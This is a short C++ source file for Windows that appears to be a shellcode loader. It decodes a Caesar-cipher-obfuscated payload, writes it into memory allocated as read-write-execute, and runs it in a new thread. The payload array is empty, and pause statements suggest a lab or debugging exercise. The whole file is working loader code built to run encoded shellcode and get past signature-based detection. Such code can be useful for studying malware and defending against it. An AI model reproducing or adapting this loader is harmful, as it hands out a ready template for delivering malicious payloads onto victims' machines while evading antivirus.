#include <iostream>
#include <windows.h>

// caesar cipher function
void cc(unsigned char* shellcode, int shift, int size) {
    int i = 0;
    do {
        shellcode[i] = (int(shellcode[i]) - shift % 255);
        i++;
    } while (i < (size - 1));
}

int main() {
    void* exec;
    HANDLE thread;

    unsigned char shellcode[] =
        "";

    // allocate space in memory
    LPVOID pBaseAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // print mem address and wait for user input
    uintptr_t addr = reinterpret_cast<uintptr_t>(pBaseAddr);
    printf("RWX memory allocated at 0x%llx\n", addr);
    system("pause");

    // decrypt 
    int shift = 3;
    cc(shellcode, shift, sizeof(shellcode));

    // move decrypted shellcode to allocated memory
    RtlMoveMemory(pBaseAddr, shellcode, sizeof(shellcode));
    printf("Shellcode moved into memory\n");
    system("pause");

    // execute 
    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pBaseAddr, 0, 0, 0);
    WaitForSingleObject(thread, INFINITE);
}
